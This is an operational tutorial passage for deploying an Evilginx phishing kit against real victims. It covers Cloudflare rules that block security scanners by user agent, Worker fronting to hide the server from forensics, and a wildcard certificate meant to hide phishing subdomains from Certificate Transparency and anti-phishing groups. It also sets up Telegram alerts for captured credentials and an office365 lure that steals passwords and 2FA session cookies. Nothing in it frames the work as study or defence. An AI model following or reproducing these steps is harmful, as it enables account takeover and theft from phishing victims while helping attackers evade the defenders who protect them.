- ✅ **Block known scanner IPs** (Shodan, Censys, etc.)
- ✅ **Block malicious bots** (vulnerability scanners, crawlers)
- ✅ **Block countries you're not targeting** (optional)
- ✅ **Rate limit aggressive scanners**
- ❌ **NOT block real victims**

---

### 4C.2 — Enable WAF Custom Rules (Free Plan)

On the free plan, you have limited WAF rules. Here's what you can do:

1. Click **Security** → **WAF** → **Custom Rules**
2. Click **"Create Rule"**

#### Rule 1: Block Known Security Scanners

| Field | Value |
|:------|:------|
| **Rule name** | `Block security scanners` |
| **Field** | `User Agent` |
| **Operator** | `contains` |
| **Value** | `(paste the string below)` |
| **Then** | `Block` |

Paste this for the Value field:
```
(curl|wget|python-requests|go-http-client|scanner|nikto|sqlmap|nmap|nessus|openvas|acunetix|burpsuite|zap|netsparker|qualys|probely|detectify|siteaudit|mozilla/4.0|masscan|httpx|httprobe|aquatone|gobuster|ffuf|dirbuster|wfuzz|hydra|medusa|hydra|metasploit)
```

**What this does:** Blocks requests from known security tools by user-agent.

Click **"Save"**.

#### Rule 2: Block Countries You're Not Targeting

| Field | Value |
|:------|:------|
| **Rule name** | `Block non-target countries` |
| **Field** | `Country` |
| **Operator** | `equals` |
| **Value** | `CN` (China) |
| **Then** | `Block` |

> **Add more countries here that you don't want to target.** Common ones to block: CN, RU, KP, IR, SY, VN

Click **"Save"**.

> **⚠️ WARNING:** If you accidentally block the country your victims are in, they can't reach your phishing page. Only block countries you're SURE you don't need.

---

### 4C.3 — Set Up Rate Limiting (Free Plan)

Free Cloudflare plans support basic rate limiting.

1. Click **Security** → **Rate Limiting Rules**
2. Click **"Create Rate Limiting Rule"**
3. Fill in:

| Field | Value |
|:------|:------|
| **Rule name** | `Anti-scanner rate limit` |
| **URL** | `*YOUR_DOMAIN/*` |
| **Requests** | `100` |
| **Period** | `60 seconds` |
| **Actions** | `Block for 10 minutes` |
| **Expression** | Leave empty (matches all traffic) |

> **What this does:** If any IP sends 100 requests in 60 seconds, they're blocked for 10 minutes. This kills aggressive scanners without affecting real users (who make 1-20 requests at normal browsing speed).

Click **"Save"**.

---

### 4C.4 — Disable Cloudflare's "Under Attack" Mode

If you ever see **"Under Attack Mode"** enabled in your Cloudflare dashboard:

1. Click **Security** → **Settings**
2. Make sure **"Under Attack Mode"** is **OFF**
> **Why:** Under Attack Mode shows a 5-second JS challenge page to ALL visitors. This will break your phishing pages (the victim sees a "checking your browser" page instead of the login page).

> **If you're under a real DDoS attack:** You can enable it temporarily, but disable it immediately after. Evilginx has its own bot protection that's more phishing-friendly.

✅ **WAF is configured. These rules reduce scanner traffic before Evilginx even sees it.**

---

## PHASE 4D — Cloudflare Workers (Traffic Fronting)

**Time: ~15 minutes | Where: Cloudflare dashboard + Server terminal**

### 🎯 Goal: Use a Cloudflare Worker as a reverse proxy so your real server IP is never exposed

**What is Worker Fronting?** Normally, traffic flows like:

```
Victim → Cloudflare DNS → Your VPS IP
```

With Worker fronting:

```
Victim → Cloudflare DNS → Cloudflare Worker → Your VPS IP
```

The victim's browser only sees Cloudflare's IP in the connection logs. Your server IP is hidden from:
- Network forensics
- Certificate Transparency logs (only the Worker's domain)
- Traceroutes and ping sweeps
- Reverse DNS lookups

---

### 4D.1 — Enable Workers on Your Account

1. In Cloudflare dashboard, click **Workers & Pages** (in the sidebar)
2. Click **"Workers"** tab
3. Click **"Create Worker"**
4. If prompted, choose a **subdomain** for your Worker (e.g., `my-worker`)

> **Example:** Your Worker will be at `my-worker.YOUR_SUBDOMAIN.workers.dev`

---

### 4D.2 — Deploy the Fronting Worker

1. In the Worker editor, **delete all the default code**
2. **Paste this code:**

```javascript
// Evilginx Cloudflare Worker Fronting Proxy
// Routes traffic to your hidden VPS

// ⚠️ CHANGE THIS to your VPS IP
const VPS_IP = 'YOUR_SERVER_IP';

// ⚠️ CHANGE THIS to the domains Evilginx is responding on
const ALLOWED_HOSTS = [
  'YOUR_DOMAIN',
  '*.YOUR_DOMAIN',
];

async function handleRequest(request) {
  const url = new URL(request.url);
  
  // Get the original hostname from the request
  const hostname = request.headers.get('Host') || url.hostname;
  
  // Check if this hostname is allowed
  const isAllowed = ALLOWED_HOSTS.some(pattern => {
    if (pattern.startsWith('*.')) {
      return hostname.endsWith(pattern.slice(1));
    }
    return hostname === pattern;
  });
  
  if (!isAllowed) {
    return new Response('Not Found', { status: 404 });
  }
  
  // Construct the back-end URL to your VPS
  const backendUrl = `http://${VPS_IP}:${url.port || 443}${url.pathname}${url.search}`;
  
  // Copy the original request headers
  const headers = new Headers(request.headers);
  
  // Add X-Forwarded-For with the real visitor IP
  headers.set('X-Forwarded-For', request.headers.get('CF-Connecting-IP') || '');
  headers.set('X-Real-IP', request.headers.get('CF-Connecting-IP') || '');
  
  // Set the Host header to the original domain
  headers.set('Host', hostname);
  
  // Create the back-end request
  const backendRequest = new Request(backendUrl, {
    method: request.method,
    headers: headers,
    body: request.method !== 'GET' && request.method !== 'HEAD' ? request.body : undefined,
  });
  
  try {
    // Forward the request to your VPS
    const response = await fetch(backendRequest);
    
    // Create a new response with the same body and status
    const newResponse = new Response(response.body, {
      status: response.status,
      statusText: response.statusText,
      headers: response.headers,
    });
    
    return newResponse;
  } catch (error) {
    // If the VPS is unreachable, return a generic error
    return new Response('Service Unavailable', { status: 503 });
  }
}

// Listen for all requests
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request));
});
```

3. **Replace these values:**
   - `YOUR_SERVER_IP` → Your actual VPS IP (e.g., `95.133.228.114`)
   - `YOUR_DOMAIN` → Your actual domain (e.g., `offices65.online`)

4. Click **"Save and Deploy"**

---

### 4D.3 — Test the Worker

Your Worker is now live at:
```
https://my-worker.YOUR_SUBDOMAIN.workers.dev
```

Test it:

```bash
curl -H "Host: YOUR_DOMAIN" http://my-worker.YOUR_SUBDOMAIN.workers.dev
```

**Expected output:** Evilginx should respond with the redirect to `unauth_url`.

---

### 4D.4 — Route Your Domain Through the Worker (Option A: Route)

The cleanest way to use the Worker:

1. In Cloudflare dashboard → **Workers & Pages** → your Worker
2. Click **"Triggers"** tab
3. Under **"Routes"**, click **"Add Route"**
4. Fill in:

| Field | Value |
|:------|:------|
| **Route** | `*YOUR_DOMAIN/*` |
| **Worker** | Select your Worker name |

> **Example Route:** `*offices65.online/*`

5. Click **"Add Route"**

Now DNS for `YOUR_DOMAIN` should use the Worker instead of going directly to your IP. 

**But wait — we're using DNS Only (grey cloud).** If we add a Worker route, Cloudflare's proxy (orange cloud) must be enabled for the route to work.

Here's the fix:

#### Step 1: Change A Records Back to Proxied (Orange Cloud)

1. Go to **DNS** tab
2. Click your `@` (root) A record
3. Toggle the orange cloud **ON** (Proxied)
4. Click **"Save"**
5. Repeat for the `*` (wildcard) A record

> **⚠️ Yes, this means Cloudflare will see your traffic. BUT the Worker is just forwarding it. If you're on a free plan, this is the tradeoff.**

#### Step 2: Set SSL to Full (Strict)

1. Go to **SSL/TLS** → **Overview**
2. Set to **"Full (Strict)"**

> **Why Strict:** The Worker connects to your VPS over TLS and will verify the certificate. Since you have a wildcard cert (Phase 7), this works perfectly.

---

### 4D.5 — Route Your Domain Through the Worker (Option B: DNS Record)

If Option A doesn't work (e.g., free plan limitations), use this alternative:

1. Keep your DNS A records as **DNS Only** (grey cloud)
2. In your Worker code, change the VPS IP lookup to use a **CNAME** instead:

Actually, for the free plan, Option A is the best approach. Just make sure:
- DNS is **Proxied** (orange cloud)
- SSL is **Full (Strict)**
- You have a wildcard cert on your VPS

---

### 4D.6 — Verify the Worker is Working

From your computer:

```bash
# Check the IP your domain resolves to
nslookup YOUR_DOMAIN 1.1.1.1
```

**Expected output:** A Cloudflare IP (104.x.x.x or 172.x.x.x), NOT your server IP.
```
Name:    offices65.online
Address: 104.21.x.x
```

```bash
# Check that Evilginx still responds through the Worker
curl -I https://YOUR_DOMAIN
```

**Expected output:** Evilginx's 302 redirect to Google (or whatever `unauth_url` you set).

✅ **Worker fronting is active. Your server IP is hidden.**

---

### 4D.7 — Disabling Worker Fronting (If Needed)

If the Worker causes issues, you can disable it:

1. Go to **Workers & Pages** → your Worker
2. Click **"Triggers"**
3. Delete the Route
4. Go to **DNS** → toggle A records back to **DNS Only** (grey cloud)
5. Set SSL back to **Full** (not Strict)

✅ **Worker is disabled. Traffic goes directly to your VPS again.**

---

## PHASE 4E — Cloudflare Turnstile CAPTCHA Setup

**Time: ~10 minutes | Where: Cloudflare dashboard + Server terminal**

### 🎯 Goal: Show a CAPTCHA before the phishing page loads, so real humans pass through but bots are blocked

**What is Turnstile?** Cloudflare's free, privacy-focused CAPTCHA alternative (like reCAPTCHA but doesn't track users). It works by running a lightweight browser check in the background — most humans pass without even seeing it.

---

### 4E.1 — Get Turnstile Site Key and Secret Key

1. Go to **[dash.cloudflare.com](https://dash.cloudflare.com)**
2. Click **Turnstile** (in the sidebar, under Workers & Pages)
3. Click **"Add Site"**
4. Fill in:

| Field | Value |
|:------|:------|
| **Site Name** | `Evilginx Protection` |
| **Domain** | `YOUR_DOMAIN` |
| **Widget Mode** | **Invisible** (recommended) or **Non-interactive** or **Visible** |
| **Pre-Clearance** | OFF (leave unchecked) |

> **Widget Mode explained:**
> - **Invisible:** Most users never see anything. Browser check runs silently. Best for stealth.
> - **Non-interactive:** May show a small checkbox. Good balance between security and UX.
> - **Visible:** Shows a widget the user must click. Most detectable.

5. Click **"Create"**

6. **📝 COPY the Site Key and Secret Key** — you'll need them.

```
Site Key: 0x4AA...XXXXX
Secret Key: 0x4AA...YYYYY
```

---

### 4E.2 — Configure Turnstile in Evilginx

Start Evilginx (if not running):

```bash
cd /root/evilginx2
./evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass 'YourPassword!' -turnstile -turnstile-sitekey '0x4AA...XXXXX' -turnstile-secret '0x4AA...YYYYY'
```

> **Replace `0x4AA...XXXXX` and `0x4AA...YYYYY` with your actual keys.**

**What the flags do:**
- `-turnstile` — Enables Turnstile CAPTCHA
- `-turnstile-sitekey` — Your public site key (embedded in the page)
- `-turnstile-secret` — Your secret key (for server-side verification)

---

### 4E.3 — Verify Turnstile is Working

1. Visit your phishing URL in a browser
2. **Expected result with Invisible mode:** The page loads normally. No CAPTCHA visible. 
3. **But behind the scenes:** Cloudflare's Turnstile ran a browser check.

If you visit with `curl` (which fails the browser check):

```bash
curl -I https://YOUR_PHISHING_URL
```

**Expected output:**
```
HTTP/1.1 403 Forbidden
```

> **The bot was blocked without ever seeing the phishing page.** 

---

### 4E.4 — Disabling Turnstile (If It Causes Issues)

If Turnstile blocks legitimate users, disable it:

```bash
# Simply don't pass the -turnstile flags when starting
./evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass 'YourPassword!' -feed
```

✅ **Turnstile is optional but recommended for blocking bots.**

---

## PHASE 4F — Cloudflare Caching & Performance

**Time: ~5 minutes | Where: Cloudflare dashboard**

### 🎯 Goal: Configure Cloudflare caching to speed up your phishing pages and protect against traffic spikes

---

### 4F.1 — Disable Caching for Phishing Pages

**⚠️ IMPORTANT:** You must NOT cache phishing pages. If a page is cached, one victim logs in, and the next victim sees the cached "logged in" page instead of the real login form.

1. Click **Rules** → **Page Rules**
2. Click **"Create Page Rule"**
3. Fill in:

| Field | Value |
|:------|:------|
| **URL** | `*YOUR_DOMAIN/l*` |
| **Pick Setting** | **"Cache Level"** → **"Bypass"** |
| **Then another setting** | **"Browser Cache TTL"** → **"0 seconds"** |
| **Then another setting** | **"Edge Cache TTL"** → **"0 seconds"** |

4. Click **"Save"**

> **What this does:** Any URL starting with `/l` (which is where your lures are served) is NEVER cached. Every visit hits your server fresh.

---

### 4F.2 — Create a Page Rule for Static Assets (Optional)

If you host custom landing pages with images/CSS, you can cache those:

1. Click **Rules** → **Page Rules**
2. Click **"Create Page Rule"**
3. Fill in:

| Field | Value |
|:------|:------|
| **URL** | `*YOUR_DOMAIN/assets*` |
| **Pick Setting** | **"Cache Level"** → **"Standard"** |
| **Then another setting** | **"Browser Cache TTL"** → **"4 hours"** |

4. Click **"Save"**

---

### 4F.3 — Enable Auto Minify (Optional)

Minifying removes unnecessary characters from HTML/CSS/JS, making pages load faster:

1. Click **Speed** → **Optimization** → **Content Optimization**
2. Toggle **"Auto Minify"** to **ON** for:
   - ✅ HTML
   - ✅ CSS
   - ✅ JavaScript

> **⚠️ CAUTION:** Minifying can break some complex phishlets. If a phishlet stops working, disable Auto Minify for that phishlet using a Page Rule:
> ```
> *YOUR_DOMAIN/SPECIFIC_PATH*
> → Auto Minify: Off
> ```

---

### 4F.4 — Enable Brotli Compression (Always On)

Brotli is better than gzip. On Cloudflare, it's **enabled by default** for HTTPS connections. Nothing to do here — it just works.

✅ **Caching is configured. Move to Phase 5.**

---

## PHASE 5 — Build Evilginx from Source

**Time: ~10 minutes | Where: Your server terminal**

### 🎯 Goal: Download the source code and compile it into a working program

---

### 5.1 — Download the Code

```bash
cd /root
git clone https://github.com/afrikaquality/evilginx2.git
cd evilginx2
```

**Expected output:**
```
Cloning into 'evilginx2'...
remote: Enumerating objects: XXX, done.
remote: Counting objects: 100% (XXX/XXX), done.
...
Receiving objects: 100% (XXXX/XXXX), X.XX MiB | X.XX MiB/s, done.
```

---

### 5.2 — Download Dependencies

```bash
go mod tidy
```

**Expected output:** Nothing or a few lines. This downloads all the Go libraries Evilginx needs.

**Expected duration:** 30 seconds.

> **If you see errors about network timeouts:**
> ```bash
> export GOPROXY=https://goproxy.io,direct
> export GO111MODULE=on
> go mod tidy
> ```

---

### 5.3 — Build the Main Binary

```bash
go build -o evilginx2 .
```

**Expected output:** Nothing (just the prompt). This compiles Evilginx into a single executable file called `evilginx2`.

**Expected duration:** 1-3 minutes.

---

### 5.4 — Build the Live Feed (Optional, but Recommended)

The live feed is a separate program that streams sessions in real-time.

```bash
cd evilfeed
go mod tidy
go build -o evilfeed .
cd ..
```

**Expected output:** Nothing. The `evilfeed` binary is created in the `evilfeed/` directory.

---

### 5.5 — Verify Both Binaries

```bash
ls -lh evilginx2
ls -lh evilfeed/evilfeed
```

**Expected output:** Two files, each ~15-30 MB, with execute permissions (the `x` in `-rwxr-xr-x`).

---

### 5.6 — Make Sure They're Executable

```bash
chmod +x evilginx2 evilfeed/evilfeed
```

✅ **Evilginx is built. Move to Phase 6.**

---

## PHASE 6 — First Run & Initial Configuration

**Time: ~10 minutes | Where: Your server terminal**

### 🎯 Goal: Start Evilginx and configure your domain

---

### 6.1 — Start Evilginx for the First Time

```bash
cd /root/evilginx2
./evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass 'YourStrongPassword123!' -feed
```

> **⚠️ Replace `YourStrongPassword123!` with an actual strong password.** Use a mix of uppercase, lowercase, numbers, and symbols.

> **⚠️ SECURITY:** Do NOT use obvious passwords like `admin123`, `password`, `evilginx`, etc.

**Expected output:**
```
[inf] loading phishlets from: ./phishlets
[inf] loading redirectors from: ./redirectors
[inf] loading lures from: /root/.evilginx/lures.json
[inf] server domain not set yet
[inf] external ipv4 not set yet
[war] individual subdomains WILL appear in Certificate Transparency (crt.sh)
[inf] starting evilginx on 0.0.0.0:443
[inf] starting http server on 0.0.0.0:80
[inf] starting DNS server on :53
[inf] starting dashboard on 0.0.0.0:5000

evilginx>
```

That `evilginx>` is your prompt — you're now in the Evilginx console.

> **🚨 If you see "address already in use":** Another program is using a port. Run `ss -tulpn | grep :443` to see what's using port 443, then stop it. Common culprits: nginx, apache, caddy.

---

### 6.2 — Set Your Domain

At the `evilginx>` prompt, type:

```
config domain YOUR_DOMAIN
```

**Replace `YOUR_DOMAIN` with your actual domain** (e.g., `config domain offices65.online`)

**Expected output:**
```
[inf] server domain set to: offices65.online
```

---

### 6.3 — Set Your Server IP

```
config ipv4 external YOUR_SERVER_IP
```

**Replace `YOUR_SERVER_IP` with your actual IP** (e.g., `config ipv4 external 95.133.228.114`)

**Expected output:**
```
[inf] external ipv4 set to: 95.133.228.114
```

---

### 6.4 — Enable Automatic Certificates

```
config autocert on
```

This tells Evilginx to automatically get SSL certificates from Let's Encrypt for each new phishlet hostname.

**Expected output:**
```
[inf] autocert set to: on
```

---

### 6.5 — Set Unauthorized URL

```
config unauth_url https://www.google.com
```

When a scanner, bot, or wrong visitor hits your phishing page, they get redirected to Google (looks like a normal website). This avoids detection.

**Expected output:**
```
[inf] unauth_url set to: https://www.google.com
```

---

### 6.6 — Enable Blacklist Mode

```
blacklist unauth
```

This auto-blocks IPs that hit unauthorized URLs (bots, scanners, security researchers).

**Expected output:**
```
[inf] blacklist mode set to: unauth
```

---

### 6.7 — Set IP Binding (Optional but Recommended)

By default, Evilginx binds to all interfaces. If you want it to listen only on your public IP:

```
config ipv4 bind YOUR_SERVER_IP
```

---

### 6.8 — Verify All Settings

```
config
```

**Expected output (example):**
```
domain: offices65.online
external_ipv4: 95.133.228.114
bind_ipv4: 0.0.0.0
unauth_url: https://www.google.com
autocert: on
blacklist_mode: unauth
https_port: 443
dns_port: 53
http_port: 80
```

✅ If you see your domain and IP correctly, you're good.

---

### 6.9 — ⚠️ CRITICAL: Save Config by Exiting Cleanly

```
exit
```

**Why this matters:** Evilginx ONLY saves the config to disk when you exit properly. If you just close the terminal, **all your settings are lost**.

**Expected output:**
```
[inf] saving configuration to /root/.evilginx/config.json
[inf] saved lures to /root/.evilginx/lures.json
[inf] exit
```

---

### 6.10 — Verify Config Was Saved

```bash
cat /root/.evilginx/config.json
```

**Expected output:** A JSON file showing your settings:
```json
{
  "general": {
    "domain": "offices65.online",
    "external_ipv4": "95.133.228.114",
    "unauth_url": "https://www.google.com",
    "autocert": true,
    "https_port": 443,
    "dns_port": 53,
    "http_port": 80
  }
}
```

> **If the file is empty or missing:** You didn't `exit` properly. Restart Evilginx, run the config commands again, then `exit`.

✅ **Domain is configured. Move to Phase 7.**

---

## PHASE 7 — Wildcard SSL Certificate (Hides Subdomains)

**Time: ~15 minutes | Where: Server terminal + Cloudflare browser**

### 🎯 Goal: Get ONE certificate that covers ALL subdomains so phishing subdomains don't show up in public logs

**Why this matters:** Without a wildcard cert, every phishing URL like `login-abc123.offices65.online` shows up in **Certificate Transparency logs** (publicly searchable at crt.sh). Anyone — including blue teams, journalists, and anti-phishing groups — can see ALL your phishing subdomains. A wildcard cert prevents this.

---

### 7.1 — Request the Certificate

```bash
certbot certonly --manual --preferred-challenges dns \
  -d "*.YOUR_DOMAIN" \
  -d "YOUR_DOMAIN"
```

**Replace `YOUR_DOMAIN`** with your actual domain.

**Example:**
```bash
certbot certonly --manual --preferred-challenges dns \
  -d "*.offices65.online" \
  -d "offices65.online"
```

---

### 7.2 — Follow Certbot's Prompts

#### Prompt 1: Email Address
```
Enter your email: you@email.com
```
Type your email and press **Enter**.

#### Prompt 2: Agree to Terms
```
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Please read the Terms of Service at...
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
(A)gree/(C)ancel: 
```
Type `A` and press **Enter**.

#### Prompt 3: Share Email with EFF
```
(Y)es/(N)o: 
```
Your choice. Type `Y` or `N` and press **Enter**.

#### Prompt 4: The TXT Record (CRITICAL)

Certbot will pause and display something like this:

```
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Please deploy a DNS TXT record under the name:
_acme-challenge.offices65.online
with the following value:

aBcDeFgHiJkLmNoPqRsTuVwXyZ1234567890aBcDeFgHiJkLmNoPqRsTu

Before continuing, verify the TXT record has been deployed.
Press Enter to Continue
```

> **⚠️ DO NOT PRESS ENTER YET.**

> **📝 COPY the long value** (the string starting with `aBcDeFgHi...`). You'll need it in the next step.

---

### 7.3 — Add the TXT Record in Cloudflare

1. Open Cloudflare dashboard → your domain → **DNS** tab
2. Click **"Add Record"**
3. Fill in:

| Field | Value |
|:------|:------|
| Type | **TXT** |
| Name | **`_acme-challenge`** |
| Content | **The value Certbot gave you** (paste it) |
| Proxy Status | ⚫ **DNS Only** (grey cloud) |
| TTL | **Auto** |

4. Click **"Save"**

---

### 7.4 — Wait 60 Seconds, Then Verify

```bash
dig @1.1.1.1 _acme-challenge.YOUR_DOMAIN TXT +short
```

**Expected output:** The EXACT value Certbot showed you, in quotes:
```
"aBcDeFgHiJkLmNoPqRsTuVwXyZ1234567890aBcDeFgHiJkLmNoPqRsTu"
```

> **If you see nothing:** Wait 60 more seconds and try again. TXT records can take up to 2 minutes to propagate.

---

### 7.5 — Press Enter in Certbot

Once the `dig` command returns your value, switch back to the terminal where Certbot is paused and press **Enter**.

**Expected output (success):**
```
Waiting for verification...
Cleaning up challenges

IMPORTANT NOTES:
 - Congratulations! Your certificate and chain have been saved at:
   /etc/letsencrypt/live/offices65.online/fullchain.pem
   Your key file has been saved at:
   /etc/letsencrypt/live/offices65.online/privkey.pem
```

> **If you get "DNS problem: NXDOMAIN":** TXT record hasn't propagated. Wait 2 minutes and redo from Step 7.1.
> 
> **If you get "too many failed requests":** You hit Let's Encrypt's rate limit. Wait 1 hour and try again.

---

### 7.6 — Copy Certificate to the Correct Directory

The Evilginx code looks for the wildcard cert at:
```
/root/.evilginx/wildcard/
```

> **⚠️ IMPORTANT:** Do NOT put it in `/root/.evilginx/crt/wildcard/`. That's wrong.

Run these exact commands:

```bash
mkdir -p /root/.evilginx/wildcard
cp /etc/letsencrypt/live/YOUR_DOMAIN/fullchain.pem /root/.evilginx/wildcard/
cp /etc/letsencrypt/live/YOUR_DOMAIN/privkey.pem /root/.evilginx/wildcard/
chmod 600 /root/.evilginx/wildcard/*.pem
```

**Replace `YOUR_DOMAIN` with your actual domain.**

---

### 7.7 — Verify Files Exist

```bash
ls -la /root/.evilginx/wildcard/
```

**Expected output:**
```
drwxr-xr-x 2 root root  4096 Jul 13 01:00 .
drwx------ 8 root root  4096 Jul 13 01:00 ..
-rw------- 1 root root  5432 Jul 13 01:00 fullchain.pem
-rw------- 1 root root  1704 Jul 13 01:00 privkey.pem
```

---

### 7.8 — Verify It's a Wildcard Cert

```bash
openssl x509 -in /root/.evilginx/wildcard/fullchain.pem -noout -subject
```

**Expected output:**
```
subject=CN = *.offices65.online
```

> **⚠️ The asterisk `*` is critical.** If you see `CN = offices65.online` (no asterisk), the cert doesn't cover subdomains. Redo Phase 7.

✅ **Wildcard cert is ready. Move to Phase 8.**

---

## PHASE 8 — Telegram Bot Setup

**Time: ~10 minutes | Where: Your phone + server terminal**

### 🎯 Goal: Create a Telegram bot and connect it to Evilginx so you get instant phone notifications when credentials are captured

---

### 8.1 — Create the Bot on Telegram

1. Open **Telegram** on your phone (or desktop)
2. In the search bar, type **@BotFather** (it has a blue verified checkmark)
3. Tap to open the chat
4. Tap **"Start"** (or send `/start`)
5. Send the message: `/newbot`
6. BotFather replies: `Alright, a new bot. How are we going to call it? Please choose a name for your bot.`
7. Send a **display name** (any name, e.g., `Phishing Monitor`)
8. BotFather replies: `Good. Now let's choose a username for your bot. It must end in 'bot'.`
9. Send a **username ending in `_bot`** (e.g., `phishing_monitor_2026_bot`)

#### BotFather Responds With:
```
Done! Congratulations on your new bot. You will find it at:
t.me/phishing_monitor_2026_bot

Use this token to access the HTTP API:
7123456789:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo
```

> **📝 COPY THE TOKEN** — it's the long alphanumeric string after "HTTP API:"
> Example: `7123456789:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo`
> This is your **Bot Token**. Save it in your notepad.

---

### 8.2 — Test the Token from Your Server

```bash
curl -s "https://api.telegram.org/botYOUR_BOT_TOKEN/getMe"
```

**Replace `YOUR_BOT_TOKEN` with the actual token from BotFather.**

**Example:**
```bash
curl -s "https://api.telegram.org/bot7123456789:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo/getMe"
```

**Expected output:**
```json
{"ok":true,"result":{"id":7123456789,"is_bot":true,"first_name":"Phishing Monitor","username":"phishing_monitor_2026_bot"}}
```

> **If you see `{"ok":false,"error_code":401,...}`:** Your token is wrong. Re-copy from BotFather.

---

### 8.3 — Get Your Chat ID

#### Step A: Message the Bot
1. In Telegram, **search for your bot's username** (e.g., `@phishing_monitor_2026_bot`)
2. Open the chat
3. Tap **"Start"** (or send any message like "Hi")

#### Step B: Get Your Chat ID
On your server:
```bash
curl -s "https://api.telegram.org/botYOUR_BOT_TOKEN/getUpdates"
```

**Expected output:** A long JSON response. Look for this section:
```json
"chat":{"id":7545456339,"first_name":"Your Name","type":"private"}
```

The number `7545456339` is your **Chat ID**.

> **📝 COPY the chat ID to your notepad.**

> **If you see `"result":[]` (empty array):** You didn't message the bot yet. Send any message first, wait 5 seconds, then try again.

#### Alternative: Use @userinfobot
If you can't find your chat ID in the JSON, message [@userinfobot](https://t.me/userinfobot) on Telegram. It will reply with your user ID (which is the same as your chat ID for private chats).

---

### 8.4 — Test the Bot (Send a Test Message)

```bash
curl -s "https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage?chat_id=YOUR_CHAT_ID&text=Hello+from+Evilginx"
```

**Replace `YOUR_BOT_TOKEN` and `YOUR_CHAT_ID` with your actual values.**

**Expected result:** Within 2-3 seconds, you should see the message "Hello from Evilginx" in your Telegram chat with the bot.

---

### 8.5 — Start Evilginx and Configure Telegram

Start Evilginx:

```bash
cd /root/evilginx2
./evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass 'YourStrongPassword123!' -feed
```

Wait for the `evilginx>` prompt.

Now configure Telegram:

```
config teletoken YOUR_BOT_TOKEN
config chatid YOUR_CHAT_ID
```

**Replace with your actual values.** Example:
```
config teletoken 7123456789:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo
config chatid 7545456339
```

**Expected output:**
```
[inf] Telegram bot token set to: 7123456789:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo
[inf] Telegram chat ID set to: 7545456339
```

---

### 8.6 — Enable Telegram Notifications

```
config telegram_enabled on
```

**Expected output:**
```
[inf] Telegram notifications enabled
```

---

### 8.7 — Test the Integration

```
test telegram
```

**Expected result:** Within 2-3 seconds, you receive a Telegram message like:

```
🤖 Evilginx Telegram Test

✅ Telegram integration is working correctly.
```

> **If you don't get the message:**
> 1. Re-verify the token: `curl -s "https://api.telegram.org/botYOUR_BOT_TOKEN/getMe"`
> 2. Re-verify the chat ID: `curl -s "https://api.telegram.org/botYOUR_BOT_TOKEN/getUpdates"`
> 3. Make sure you typed the values correctly (no extra spaces, correct case)

---

### 8.8 — Save and Exit

```
exit
```

✅ **Telegram is working. Move to Phase 9.**

---

## PHASE 9 — Create Your First Phishing Campaign

**Time: ~15 minutes | Where: Evilginx console**

### 🎯 Goal: Enable a phishlet (website template), generate a phishing URL, and capture a test session

---

### 9.1 — List Available Phishlets

At the `evilginx>` prompt (start Evilginx if not already running):

```
phishlets
```

**Expected output:**
```
           phishlet      status   hostname
─────────────────────────────────────────
            office365    disabled
              google     disabled
             linkedin    disabled
            facebook     disabled
            instagram    disabled
              twitter    disabled
            github       disabled
        (and 30+ more...)
```

These are YAML template files in the `phishlets/` directory. Each one knows how to copy a specific website.

---

### 9.2 — Find the Phishlet You Want

Common phishlets available in this fork:

| Phishlet | Targets | Difficulty | Captures |
|:---------|:--------|:-----------|:---------|
| `office365` | Microsoft 365, Outlook, OneDrive | Easy | Email, password, 2FA cookies |
| `microsoft` | Microsoft Account (personal) | Easy | Email, password, 2FA cookies |
| `google` | Gmail, Google Workspace | Medium | Email, password, session cookies |
| `linkedin` | LinkedIn | Easy | Email, password |
| `facebook` | Facebook | Medium | Email, password, session cookies |
| `instagram` | Instagram | Medium | Username, password |
| `github` | GitHub | Easy | Email, password, 2FA tokens |
| `twitter` | Twitter/X | Medium | Username, password |
| `protonmail` | ProtonMail | Hard | Email, password |
| `outlook` | Outlook.com | Easy | Email, password, cookies |

For this guide, I'll use `office365` as the example. Replace with your target.

---

### 9.3 — Set Hostname for the Phishlet

```
phishlets hostname office365 YOUR_DOMAIN
```

**Example:**
```
phishlets hostname office365 offices65.online
```

**Expected output:**
```
[inf] set hostname for 'office365' to: offices65.online
```

---

### 9.4 — Enable the Phishlet

```
phishlets enable office365
```

**Wait 30-60 seconds.** Evilginx will:
1. Generate a random subdomain (e.g., `login-xyz.offices65.online`)
2. Use the wildcard SSL cert to enable HTTPS
3. Set up the reverse proxy
4. Configure token capture

**Expected output:**
```
[inf] phishlet 'office365' is now enabled
```

> **If you see certificate errors:** Make sure your wildcard cert is at `/root/.evilginx/wildcard/` (Phase 7).

---

### 9.5 — Verify the Phishlet is Enabled

```
phishlets
```

**Expected output:**
```
           phishlet      status   hostname
─────────────────────────────────────────
            office365    enabled  offices65.online
```

The `status` column should say `enabled`.

---

### 9.6 — Create a Lure (Phishing URL)

```
lures create office365
```

**What's a lure?** A lure is a specific phishing URL. You can create multiple lures for the same phishlet (with different paths/hostnames) to track different campaigns.

**Expected output:**
```
[inf] created lure with ID: 0
```

---

### 9.7 — Get Your Phishing URL

```
lures get-url 0
```

**Expected output:**
```
https://login-abc123def456.offices65.online/aBcDeFgHiJ
```

> **📝 COPY THIS URL.** This is the URL you'll send to your target.

---

### 9.8 — Test the URL in a Private Browser Window

1. Open a **new incognito/private browsing window** in your browser
2. Paste the phishing URL
3. Press **Enter**

**Expected result:** A perfect replica of the Microsoft Office 365 login page loads.

> **If you see a blank page:** Wait 30 seconds (DNS cache, SSL handshake), then refresh.
> 
> **If you see a Cloudflare error:** Your A record is still proxied (orange cloud). Go to Cloudflare and turn it grey.
> 
> **If you see a certificate warning:** Your wildcard cert is misconfigured. Redo Phase 7.

---

### 9.9 — Test the Full Capture

1. On the fake Microsoft login page, type a **fake username** (e.g., `test@yourdomain.com`)
2. Type a **fake password** (e.g., `MyTestPassword123`)
3. Click **"Sign In"** (or "Next")
